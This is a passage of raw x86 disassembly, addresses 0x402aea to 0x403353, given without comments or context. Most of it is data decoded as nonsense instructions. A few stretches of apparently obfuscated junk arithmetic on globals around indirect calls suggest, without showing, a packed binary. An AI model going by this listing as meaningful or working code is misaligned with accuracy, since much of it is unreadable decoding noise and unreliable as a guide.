  402aea:	cmp    eax,0x6cf787e1
  402aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402af0:	jbe    0x402afd
  402af2:	mov    ah,BYTE PTR [eax]
  402af4:	add    edi,DWORD PTR [eax+0x38dc8053]
  402afa:	jmp    0x402ad5
  402afc:	or     eax,0x92c693e5
  402b01:	and    ebx,0xffffffc1
  402b04:	outs   dx,DWORD PTR ds:[esi]
  402b05:	ret    0xdc02
  402b08:	fs cdq 
  402b0a:	pop    es
  402b0b:	push   ebx
  402b0c:	imul   esp,eax,0x4a1f596a
  402b12:	add    eax,0x10b295e4
  402b17:	not    BYTE PTR [edi]
  402b19:	push   ecx
  402b1a:	mov    ds:0x8a6170a7,eax
  402b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b20:	aas    
  402b21:	pop    eax
  402b22:	jp     0x402b9a
  402b24:	loope  0x402ad6
  402b26:	sahf   
  402b27:	imul   ebx,DWORD PTR ds:0x6f3dc6cc,0x9ad7892e
  402b31:	stc    
  402b32:	shl    BYTE PTR ds:0xb69af06e,cl
  402b38:	ins    BYTE PTR es:[edi],dx
  402b39:	outs   dx,DWORD PTR ds:[esi]
  402b3a:	cmp    edx,DWORD PTR [ebx+0x53]
  402b3d:	pop    esi
  402b3e:	and    edx,ebp
  402b40:	arpl   WORD PTR [edx-0x69934344],sp
  402b46:	enter  0x9bae,0x20
  402b4a:	dec    ecx
  402b4b:	iret   
  402b4c:	adc    DWORD PTR [esi+eiz*1+0x1b],ebp
  402b50:	lds    esp,FWORD PTR [edi-0x5d]
  402b53:	dec    edx
  402b54:	(bad)  
  402b55:	and    DWORD PTR [ecx+0x6d],esi
  402b58:	push   esp
  402b59:	inc    ecx
  402b5a:	in     eax,dx
  402b5b:	ret    0x1b37
  402b5e:	in     eax,dx
  402b5f:	xchg   ecx,eax
  402b60:	sbb    eax,0x976abde1
  402b65:	dec    esp
  402b66:	jno    0x402b36
  402b68:	les    ebx,FWORD PTR [edi-0x2097afaf]
  402b6e:	or     eax,0x1d810000
  402b73:	xchg   edi,eax
  402b74:	add    DWORD PTR [edx+0x0],0xffffffe0
  402b78:	inc    ecx
  402b79:	add    BYTE PTR [eax],al
  402b7b:	push   0x2d0f
  402b80:	call   0x42206f
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x428283,0x0
  402b94:	mov    edx,DWORD PTR ds:0x428397
  402b9a:	mov    DWORD PTR ds:0x42818f,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x428233
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x42830b,ebx
  402bb6:	cmp    DWORD PTR ds:0x428283,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428d84
  402bcc:	mov    edx,DWORD PTR ds:0x428293
  402bd2:	add    DWORD PTR ds:0x42826b,edx
  402bd8:	mov    DWORD PTR ds:0x42830f,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42824b
  402be8:	mov    edx,DWORD PTR ds:0x42831b
  402bee:	sbb    DWORD PTR ds:0x4282a7,edx
  402bf4:	mov    edx,DWORD PTR ds:0x428263
  402bfa:	xor    DWORD PTR ds:0x428327,edx
  402c00:	and    edx,DWORD PTR ds:0x4282ff
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x42822b,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x4281d3
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42825b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x422588
  402c34:	or     DWORD PTR ds:0x428153,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x4282fb,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x42838f,0x42836b
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [edi+eiz*8-0x4a],0xffffffeb
  402c79:	mov    esi,0x1818f4b6
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    BYTE PTR [eax-0x2607969b],cl
  402c87:	cmp    esi,DWORD PTR [eax+edx*2+0x2b236065]
  402c8e:	mov    esp,0x7d71c64b
  402c93:	jnp    0x402c99
  402c95:	repnz fist DWORD PTR [edi]
  402c98:	shr    DWORD PTR [ecx-0x6b],0xc9
  402c9c:	scas   al,BYTE PTR es:[edi]
  402c9d:	pusha  
  402c9e:	sub    ebp,ecx
  402ca0:	mov    edi,0xf43623a4
  402ca5:	sub    eax,esp
  402ca7:	std    
  402ca8:	std    
  402ca9:	push   0xffffffc0
  402cab:	adc    eax,0x1cbcc7e0
  402cb0:	(bad)  
  402cb1:	mov    bl,0x81
  402cb3:	div    bl
  402cb5:	jecxz  0x402c78
  402cb7:	cmp    eax,esi
  402cb9:	pcmpeqw mm0,QWORD PTR [ebx-0x212fccbe]
  402cc0:	sahf   
  402cc1:	mov    ebp,0xf905565e
  402cc6:	jae    0x402ce0
  402cc8:	pushf  
  402cc9:	mov    ds:0x186e7fe7,al
  402cce:	aad    0x49
  402cd0:	stos   BYTE PTR es:[edi],al
  402cd1:	stos   DWORD PTR es:[edi],eax
  402cd2:	jecxz  0x402cc6
  402cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cd5:	xor    BYTE PTR [esi+esi*8],al
  402cd8:	pop    edi
  402cd9:	cmc    
  402cda:	mov    ecx,0x3456d58a
  402cdf:	icebp  
  402ce0:	into   
  402ce1:	sub    esi,ebx
  402ce3:	pop    ds
  402ce4:	or     cl,BYTE PTR [eax+0x4f4241b3]
  402cea:	mov    bl,0x61
  402cec:	lods   al,BYTE PTR ds:[esi]
  402ced:	dec    eax
  402cee:	ja     0x402cd9
  402cf0:	pop    ds
  402cf1:	mov    dh,0xb8
  402cf3:	mov    ds:0xb4eb219f,al
  402cf8:	push   cs
  402cf9:	and    al,0x96
  402cfb:	xchg   edi,eax
  402cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cfd:	fnstsw WORD PTR [eax]
  402cff:	retf   
  402d00:	push   esi
  402d01:	das    
  402d02:	xor    ch,bh
  402d04:	bound  edx,QWORD PTR [esi+0x70]
  402d07:	out    0x96,eax
  402d09:	in     eax,dx
  402d0a:	in     eax,dx
  402d0b:	(bad)  
  402d0c:	jns    0x402d84
  402d0e:	mov    es,WORD PTR [esi+0x54bb9a64]
  402d14:	mov    bh,BYTE PTR [edi+0x4c61b20c]
  402d1a:	mov    ebp,0x1ffa295d
  402d1f:	add    eax,0x5567297c
  402d24:	pushf  
  402d25:	push   0x93f4206e
  402d2a:	inc    ebx
  402d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d2c:	pop    ebx
  402d2d:	cmp    DWORD PTR [ebx],ecx
  402d2f:	mov    al,ds:0x3e367912
  402d34:	fidivr WORD PTR [edi+0x12b577a9]
  402d3a:	not    BYTE PTR [esi]
  402d3c:	sbb    dl,BYTE PTR [ecx+0x65]
  402d3f:	ret    0x4502
  402d42:	mov    ebp,0xb4ff5ab
  402d47:	push   edx
  402d48:	fsubrp st(3),st
  402d4a:	mov    esi,DWORD PTR [ebx-0x5c]
  402d4d:	iret   
  402d4e:	push   ecx
  402d4f:	clc    
  402d50:	xchg   esp,eax
  402d51:	cli    
  402d52:	xor    DWORD PTR [edi-0x364353ef],edx
  402d58:	adc    BYTE PTR [ecx],bl
  402d5a:	fcmovnbe st,st(1)
  402d5c:	imul   si,WORD PTR [esi+0x16],0xfff3
  402d61:	jns    0x402d38
  402d63:	jns    0x402dc3
  402d65:	jne    0x402d1c
  402d67:	xchg   DWORD PTR [edx-0x73d188bb],ecx
  402d6d:	mov    bl,0x0
  402d6f:	rcl    bh,1
  402d71:	pop    DWORD PTR [edi]
  402d73:	shl    dl,0x36
  402d76:	retf   0xfa5
  402d79:	pushf  
  402d7a:	lods   eax,DWORD PTR ds:[esi]
  402d7b:	or     ecx,eax
  402d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d7e:	or     bl,BYTE PTR [ecx+0x41ce2017]
  402d84:	std    
  402d85:	sti    
  402d86:	in     eax,dx
  402d87:	mov    edi,0x4446b359
  402d8c:	out    dx,eax
  402d8d:	dec    eax
  402d8e:	mov    al,0xe1
  402d90:	aaa    
  402d91:	push   es
  402d92:	sbb    DWORD PTR [esi-0x1ff151e9],esi
  402d98:	bnd ret 
  402d9a:	cli    
  402d9b:	push   esp
  402d9c:	in     al,dx
  402d9d:	das    
  402d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402da0:	mov    esi,0x7d9f11b0
  402da5:	ret    0x5e98
  402da8:	adc    ebp,ebx
  402daa:	xchg   ebx,eax
  402dab:	mov    bh,bl
  402dad:	pop    edx
  402dae:	(bad)  
  402daf:	std    
  402db0:	or     DWORD PTR [eax-0x173909b8],0x59131595
  402dba:	jl     0x402da6
  402dbc:	xor    al,0x39
  402dbe:	inc    edx
  402dbf:	dec    edx
  402dc0:	ds shr bh,cl
  402dc3:	adc    ah,BYTE PTR [ecx+0x1118290b]
  402dc9:	xabort 0x77
  402dcc:	scas   eax,DWORD PTR es:[edi]
  402dcd:	push   ebx
  402dce:	repz and eax,0x8d994f6d
  402dd4:	cmp    al,BYTE PTR [ebx]
  402dd6:	push   edi
  402dd7:	ins    BYTE PTR es:[edi],dx
  402dd8:	pop    esp
  402dd9:	daa    
  402dda:	sub    BYTE PTR [edx+0x69171650],dl
  402de0:	daa    
  402de1:	out    dx,eax
  402de2:	int    0x8c
  402de4:	pop    edi
  402de5:	out    dx,al
  402de6:	(bad)  
  402de8:	xor    ah,BYTE PTR [eax+edi*2+0x7f]
  402dec:	mov    bl,0xba
  402dee:	dec    esp
  402def:	rol    DWORD PTR [edx+0xeaa95f1],0x0
  402df6:	(bad)  
  402df7:	mov    ecx,0xc0e4ed17
  402dfc:	fadd   st,st(3)
  402dfe:	pop    esi
  402dff:	fmul   DWORD PTR ds:0x23eb4c28
  402e05:	mov    esp,0xc0d8e22f
  402e0a:	xor    BYTE PTR [ecx+0x26],ch
  402e0d:	dec    ebp
  402e0e:	xlat   BYTE PTR ds:[ebx]
  402e0f:	sbb    ebx,DWORD PTR [ebx]
  402e11:	and    bl,bl
  402e13:	xor    BYTE PTR [ebx],dl
  402e15:	or     al,BYTE PTR [edx]
  402e17:	xchg   DWORD PTR [esi+ebp*1],ebx
  402e1a:	repz js 0x402e41
  402e1d:	or     DWORD PTR [esp+eiz*4-0x4031ffed],edx
  402e24:	pop    edx
  402e25:	bnd ja 0x402e49
  402e28:	ins    BYTE PTR es:[edi],dx
  402e29:	fld    DWORD PTR [ebx]
  402e2b:	shr    BYTE PTR [edi+0x5eed42a5],0xbd
  402e32:	xor    dl,BYTE PTR [edi-0x4597ff36]
  402e38:	pop    es
  402e39:	pop    ss
  402e3a:	mov    al,0xb0
  402e3c:	fbstp  TBYTE PTR [edx+0x29c20f49]
  402e42:	and    ah,BYTE PTR [ecx-0x53]
  402e45:	adc    BYTE PTR [ecx],bl
  402e47:	xor    eax,0x7a0e3156
  402e4c:	cmp    eax,0xf9970321
  402e51:	cwde   
  402e52:	or     BYTE PTR [eax-0x44e38164],ah
  402e58:	imul   edi,DWORD PTR [ecx],0x8d40d110
  402e5e:	sti    
  402e5f:	sub    al,ah
  402e61:	cld    
  402e62:	mov    ch,0xe9
  402e64:	push   ds
  402e65:	std    
  402e66:	mov    ecx,DWORD PTR [edi+edx*4-0x3d715d03]
  402e6d:	adc    al,0xea
  402e6f:	xchg   ebp,eax
  402e70:	mov    al,0x67
  402e72:	jp     0x402eb6
  402e74:	jne    0x402e8e
  402e76:	daa    
  402e77:	xchg   edi,eax
  402e78:	sub    al,0x9a
  402e7a:	pop    ebp
  402e7b:	xor    ebp,DWORD PTR [edx+0x64844929]
  402e81:	lahf   
  402e82:	xchg   DWORD PTR [edi+esi*1],ebp
  402e85:	push   es
  402e86:	cli    
  402e87:	js     0x402e71
  402e89:	push   ebx
  402e8a:	fwait
  402e8b:	adc    eax,DWORD PTR [ecx-0x41317cff]
  402e91:	repnz mov ah,0x12
  402e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e95:	push   es
  402e96:	or     DWORD PTR [edx+0x1428dcf1],0x5
  402e9d:	inc    esi
  402e9e:	pop    eax
  402e9f:	repz mov edi,0xe49c6b4c
  402ea5:	in     eax,dx
  402ea6:	fst    st(5)
  402ea8:	dec    edi
  402ea9:	inc    ebp
  402eaa:	pop    edi
  402eab:	xchg   esi,eax
  402eac:	imul   esp,DWORD PTR [ebp+eiz*2-0x79],0xeca75071
  402eb4:	add    DWORD PTR [esi+0xd94773e],0xfffffff4
  402ebb:	stc    
  402ebc:	popa   
  402ebd:	in     eax,0xfb
  402ebf:	inc    ebx
  402ec0:	sbb    al,0x33
  402ec2:	sub    eax,DWORD PTR ds:0x16864240
  402ec8:	inc    ecx
  402ec9:	(bad)  
  402eca:	call   0x620d8468
  402ecf:	add    al,0xfd
  402ed1:	xchg   esp,eax
  402ed2:	add    esi,DWORD PTR [eax+edi*8-0x2c]
  402ed6:	imul   ebp,DWORD PTR [edx],0x0
  402ed9:	push   cs
  402eda:	test   DWORD PTR [ecx+0x55c3d0a6],esp
  402ee0:	jb     0x402ef0
  402ee2:	xor    al,0xf1
  402ee4:	nop
  402ee5:	es sbb BYTE PTR gs:[edi+0x68ad815e],ah
  402eed:	pop    ss
  402eee:	int3   
  402eef:	cmp    al,ah
  402ef1:	adc    DWORD PTR [edx-0x53],ecx
  402ef4:	jnp    0x402f71
  402ef6:	lahf   
  402ef7:	add    bh,0xd2
  402efa:	cdq    
  402efb:	xor    al,0x23
  402efd:	fild   WORD PTR [eax+0x26]
  402f00:	jge    0x402f66
  402f02:	sahf   
  402f03:	xchg   ebp,eax
  402f04:	shl    BYTE PTR [edx-0x50ff1306],1
  402f0a:	cmp    DWORD PTR [ebp-0x54],ecx
  402f0d:	and    ebx,DWORD PTR [eax]
  402f0f:	cdq    
  402f10:	xor    DWORD PTR es:[ecx],esi
  402f13:	and    eax,0xc4e1d9cb
  402f18:	icebp  
  402f19:	sbb    dh,dh
  402f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f1c:	mov    dh,ch
  402f1e:	jnp    0x402ef5
  402f20:	push   eax
  402f21:	daa    
  402f22:	pop    ebx
  402f23:	xor    eax,0xe195c15e
  402f28:	enter  0x482a,0x65
  402f2c:	daa    
  402f2d:	(bad)  
  402f2e:	in     al,dx
  402f2f:	mov    dh,BYTE PTR [ecx-0x771343f5]
  402f35:	pop    edx
  402f36:	adc    al,0xd3
  402f38:	loope  0x402f54
  402f3a:	jbe    0x402f93
  402f3c:	lods   al,BYTE PTR ds:[esi]
  402f3d:	loope  0x402f8b
  402f3f:	pop    ebx
  402f40:	aad    0x3c
  402f42:	xchg   dh,cl
  402f44:	adc    BYTE PTR [esp+esi*2-0x206ef3ef],cl
  402f4b:	pop    edi
  402f4c:	nop
  402f4d:	xchg   ebx,eax
  402f4e:	rol    DWORD PTR [esi+0x450778ac],cl
  402f54:	dec    edx
  402f55:	mov    edx,0xc9d4c960
  402f5a:	dec    eax
  402f5b:	aad    0x2c
  402f5d:	jmp    0x85c9c199
  402f62:	inc    ebx
  402f63:	test   BYTE PTR [edx+ebp*8-0x6],0x3f
  402f68:	mov    al,0x91
  402f6a:	jns    0x402f84
  402f6c:	xchg   edi,eax
  402f6d:	dec    ebp
  402f6e:	std    
  402f6f:	aas    
  402f70:	lahf   
  402f71:	xor    DWORD PTR [edi-0xe9b0efe],0xffffff8e
  402f78:	sub    DWORD PTR [esi+0x6287789d],ebp
  402f7e:	add    al,0x64
  402f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f81:	push   edx
  402f82:	xchg   BYTE PTR [edx-0x3],bl
  402f85:	jb     0x402f6c
  402f87:	mov    esi,0xe55d1624
  402f8c:	add    al,0x8d
  402f8e:	push   ebp
  402f8f:	icebp  
  402f90:	mov    eax,0x9fdcf3f2
  402f95:	add    ah,BYTE PTR [edi+0x11]
  402f98:	sub    bl,BYTE PTR [edi]
  402f9a:	pop    edi
  402f9b:	mov    dh,0x6b
  402f9d:	jge    0x402f6e
  402f9f:	xlat   BYTE PTR ds:[ebx]
  402fa0:	sbb    BYTE PTR ds:0x660af117,bh
  402fa6:	push   0x78fd2258
  402fab:	ror    BYTE PTR [ebx+ecx*8+0x356888d2],1
  402fb2:	cmp    ah,ch
  402fb4:	div    DWORD PTR [ecx]
  402fb6:	dec    ecx
  402fb7:	stos   BYTE PTR es:[edi],al
  402fb8:	pop    esp
  402fb9:	ins    BYTE PTR es:[edi],dx
  402fba:	xchg   BYTE PTR [eax],ch
  402fbc:	mov    BYTE PTR [ebp-0x79],dl
  402fbf:	in     al,dx
  402fc0:	or     eax,DWORD PTR [edi+0x71ea5e15]
  402fc6:	xor    DWORD PTR [ebx-0x3e51105c],0xff615e92
  402fd0:	ret    
  402fd1:	jmp    0x94545c85
  402fd6:	nop
  402fd7:	mov    bl,0x0
  402fd9:	dec    ecx
  402fda:	mov    WORD PTR [ebx],ss
  402fdc:	loopne 0x402fc1
  402fde:	sub    dl,BYTE PTR [eax]
  402fe0:	add    eax,0x3a65cb7a
  402fe5:	inc    esp
  402fe6:	ficom  DWORD PTR [ebp-0x437da8bc]
  402fec:	dec    ebx
  402fed:	in     al,0x15
  402fef:	push   cs
  402ff0:	ss out dx,eax
  402ff2:	push   ecx
  402ff3:	jo     0x403002
  402ff5:	cmp    al,0x28
  402ff7:	fild   QWORD PTR [edi-0x5a]
  402ffa:	xchg   BYTE PTR [esp+ebx*4+0x3b05189c],ah
  403001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403002:	sub    BYTE PTR [edx+0x62],cl
  403005:	mov    ebx,0x3f241d6
  40300a:	pushf  
  40300b:	int    0x14
  40300d:	push   es
  40300e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40300f:	sti    
  403010:	add    al,0x2d
  403012:	mov    dl,BYTE PTR [edx]
  403014:	mov    es,ebx
  403016:	xchg   ecx,eax
  403017:	not    DWORD PTR [ebx-0x452a24d2]
  40301d:	and    bl,bl
  40301f:	or     DWORD PTR [esi+eiz*2+0x3],0x503659ae
  403027:	loopne 0x403019
  403029:	into   
  40302a:	jge    0x40305e
  40302c:	aaa    
  40302d:	dec    ecx
  40302e:	jle    0x403088
  403030:	mov    al,ds:0x89ab9f9f
  403035:	(bad)  
  403036:	ficom  WORD PTR [ecx+0x1ccf80d]
  40303c:	pop    edx
  40303d:	push   0xa4f9b1a0
  403042:	jo     0x403067
  403044:	retf   0xc281
  403047:	arpl   WORD PTR [eax+eax*1],si
  40304a:	add    BYTE PTR [ebx-0x35f433ab],cl
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x42829b,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x42839f,0x0
  403071:	mov    DWORD PTR ds:0x4283a3,edx
  403077:	mov    DWORD PTR ds:0x4282eb,0x1413
  403081:	mov    edx,DWORD PTR ds:0x428393
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42815f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x42839f,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428da4
  4030b1:	mov    DWORD PTR ds:0x42824b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x42826f
  4030c1:	or     edx,DWORD PTR ds:0x42830b
  4030c7:	add    edx,DWORD PTR ds:0x42818f
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x428397,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x42831f
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x428383
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x4283a3,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42815b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x4283a7,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x40314b
  403121:	js     0x403137
  403123:	stos   BYTE PTR es:[edi],al
  403124:	cmp    eax,0x9e1818ec
  403129:	adc    bl,BYTE PTR [eax]
  40312b:	sbb    BYTE PTR [ecx],bh
  40312d:	pop    esi
  40312e:	(bad)  
  40312f:	sub    DWORD PTR [ecx],esi
  403131:	pusha  
  403132:	mov    dh,BYTE PTR [eax+eiz*8-0x57]
  403136:	in     eax,0x7c
  403138:	jmp    0xa2f44348
  40313d:	cwde   
  40313e:	mov    edx,0xa0d3b5c8
  403143:	data16 or ch,BYTE PTR [esi+0x1b]
  403147:	mov    ebx,0x7977d286
  40314c:	test   BYTE PTR [ebx-0x69ba8e5f],dl
  403152:	nop
  403153:	cwde   
  403154:	mov    BYTE PTR [eax+edx*1],dl
  403157:	dec    ebx
  403158:	jae    0x4030e8
  40315a:	pop    DWORD PTR [ecx+ebp*1]
  40315d:	ins    BYTE PTR es:[edi],dx
  40315e:	pop    ds
  40315f:	xchg   ebx,eax
  403160:	sbb    al,BYTE PTR [esi]
  403162:	lea    ebp,[edi-0x4b]
  403165:	cmp    eax,0x4bed56a8
  40316a:	jb     0x403165
  40316c:	and    BYTE PTR [ebx+edx*1+0x2f1c5d1e],ah
  403173:	add    al,0xc6
  403175:	lss    ebp,FWORD PTR ds:0xc67f0082
  40317c:	cmc    
  40317d:	in     al,0x91
  40317f:	inc    ebp
  403180:	test   al,0xf7
  403182:	out    dx,al
  403183:	xchg   ecx,eax
  403184:	xchg   ebp,eax
  403185:	jmp    0xa44b:0x44bc889b
  40318c:	(bad)  
  40318d:	cli    
  40318e:	xchg   esi,eax
  40318f:	gs je  0x40311b
  403192:	leave  
  403193:	mov    bl,dl
  403195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403196:	mov    ch,0x5f
  403198:	xchg   ebx,eax
  403199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40319a:	inc    eax
  40319b:	and    eax,0xb534a507
  4031a0:	xor    dx,bx
  4031a3:	adc    eax,DWORD PTR [esi]
  4031a5:	push   eax
  4031a6:	xor    DWORD PTR [ebp-0x5c],ebp
  4031a9:	mov    dh,BYTE PTR ds:0xf7ba1c78
  4031af:	mov    edi,DWORD PTR es:[ebp-0x24cbb15c]
  4031b6:	leave  
  4031b7:	xor    al,0xef
  4031b9:	std    
  4031ba:	inc    esi
  4031bb:	fldenv [ebx-0x275c0436]
  4031c1:	push   esp
  4031c2:	pushf  
  4031c3:	push   0xffffff9c
  4031c5:	mov    ebp,0x92a509bb
  4031ca:	in     al,dx
  4031cb:	sbb    eax,0x23e82dbe
  4031d0:	dec    eax
  4031d1:	(bad)  
  4031d3:	jmp    0x26eca0cd
  4031d8:	jge    0x4031ff
  4031da:	mov    bh,0xab
  4031dc:	sbb    DWORD PTR ds:0x608b694b,0xffffff87
  4031e3:	cld    
  4031e4:	jmp    0x6ac7b8f0
  4031e9:	add    ebx,DWORD PTR [ebp+edi*1+0xf1e9f47]
  4031f0:	sub    al,0x3e
  4031f2:	adc    al,ch
  4031f4:	mov    eax,ds:0x53715953
  4031f9:	out    dx,eax
  4031fa:	outs   dx,BYTE PTR ds:[esi]
  4031fb:	(bad)  
  4031fc:	push   0xe
  4031fe:	fcmovnu st,st(7)
  403200:	nop
  403201:	pop    eax
  403202:	mul    BYTE PTR [eax]
  403204:	lahf   
  403205:	ins    DWORD PTR es:[edi],dx
  403206:	pushf  
  403207:	imul   edx,esp,0x6a
  40320a:	mov    edi,0x76bb8529
  40320f:	retf   
  403210:	arpl   WORD PTR [edx+ebx*2+0x721b1b61],bx
  403217:	nop
  403218:	paddq  mm4,mm1
  40321b:	(bad)  
  40321c:	hlt    
  40321d:	or     esp,DWORD PTR [eax+eax*8+0x34]
  403221:	lea    esp,[ebx-0x45]
  403224:	ss sbb ecx,ecx
  403227:	inc    ecx
  403228:	dec    eax
  403229:	mov    edi,0xf4b152f8
  40322e:	push   ss
  40322f:	adc    al,0xe9
  403231:	xor    ch,ah
  403233:	xchg   DWORD PTR [esi+ebx*2+0x4c],esp
  403237:	hlt    
  403238:	jne    0x403203
  40323a:	xor    ch,bl
  40323c:	out    0xb0,al
  40323e:	(bad)  
  40323f:	mov    bl,0xc0
  403241:	data16 rol BYTE PTR [ebx-0x3],1
  403245:	enter  0x1920,0xaf
  403249:	cdq    
  40324a:	pop    ebp
  40324b:	sbb    BYTE PTR [eax-0x3e316081],0x1e
  403252:	(bad)  
  403254:	imul   ebp,DWORD PTR [edx-0x19953880],0xffffff9c
  40325b:	loop   0x403203
  40325d:	mov    ch,0xca
  40325f:	fsub   QWORD PTR [ebx-0x58]
  403262:	jb     0x4032ab
  403264:	das    
  403265:	mov    ah,0x22
  403267:	into   
  403268:	sub    DWORD PTR [edx-0x24],0x479a7554
  40326f:	add    esp,DWORD PTR [ebp+0x78]
  403272:	sbb    BYTE PTR [ebx-0x5a],ch
  403275:	jno    0x403292
  403277:	cs pop esp
  403279:	mov    BYTE PTR [edi+ebx*8+0x20],dl
  40327d:	and    ebp,DWORD PTR [ecx]
  40327f:	cli    
  403280:	fwait
  403281:	and    al,0xc6
  403283:	shr    BYTE PTR [edx],0xc6
  403286:	and    ah,al
  403288:	cmp    BYTE PTR [ebx+0x22],al
  40328b:	mov    ch,0x25
  40328d:	sub    al,0x1
  40328f:	push   ebp
  403290:	fst    st(6)
  403292:	sub    eax,0x69ba26a
  403297:	xchg   ebx,eax
  403298:	ret    
  403299:	sbb    DWORD PTR [edi+0xe],ebp
  40329c:	jp     0x2c77c2e2
  4032a2:	retf   
  4032a3:	imul   esp,DWORD PTR [esi+0x48],0xffffffb1
  4032a7:	mov    DWORD PTR [edx-0x7bc16a3d],ebp
  4032ad:	in     eax,dx
  4032ae:	call   0xc55b:0xa54bf2d5
  4032b5:	push   0x3e64f253
  4032ba:	fisubr DWORD PTR [edx+0x36]
  4032bd:	fnstcw WORD PTR [ebp+eax*2+0x2f590f22]
  4032c4:	fld    TBYTE PTR [esi+0x6184136a]
  4032ca:	arpl   WORD PTR [ebx+0x15825f95],dx
  4032d0:	pop    ecx
  4032d1:	out    0x18,eax
  4032d3:	test   eax,0x6e40912
  4032d8:	rcpps  xmm4,xmm1
  4032db:	repz or al,0x43
  4032de:	fldenv [edx-0x4c]
  4032e1:	ins    BYTE PTR es:[di],dx
  4032e3:	jnp    0x403325
  4032e5:	jne    0x4032b0
  4032e7:	rcr    BYTE PTR [ebp+edi*4-0x61faec12],0x83
  4032ef:	fistp  DWORD PTR [ecx+edi*1-0x70]
  4032f3:	dec    eax
  4032f4:	sbb    DWORD PTR [ebp-0x6c],0xdeca74cf
  4032fb:	addr16 jl 0x403305
  4032fe:	adc    esp,DWORD PTR ds:0x3ccf47a5
  403304:	push   0x11
  403306:	lods   eax,DWORD PTR ds:[esi]
  403307:	dec    ebx
  403308:	es jecxz 0x403313
  40330b:	int3   
  40330c:	cbw    
  40330e:	(bad)  
  40330f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403310:	adc    DWORD PTR [edx+0x3b],edi
  403313:	jl     0x40329c
  403315:	jle    0x403347
  403317:	arpl   WORD PTR [edx],si
  403319:	shl    BYTE PTR [ecx-0x709b64b],cl
  40331f:	pop    ebp
  403320:	retf   
  403321:	lock dec eax
  403323:	cmp    DWORD PTR [esi],0x8ad730c7
  403329:	pop    ebx
  40332a:	mov    bh,al
  40332c:	add    BYTE PTR [edx-0x5d],0x70
  403330:	or     DWORD PTR [edx],ecx
  403332:	mov    eax,0xa0f4aca1
  403337:	aam    0xf2
  403339:	js     0x4032f5
  40333b:	jmp    edx
  40333d:	mov    ecx,DWORD PTR [esi+0x47]
  403340:	and    DWORD PTR [edx],0x78
  403343:	stos   DWORD PTR es:[edi],eax
  403344:	add    DWORD PTR [ebp+0x54],ebp
  403347:	mov    edx,0x5de57145
  40334c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40334d:	inc    ebx
  40334e:	sub    edi,DWORD PTR [bp-0x2f0e]
  403353:	mov    bl,0x28
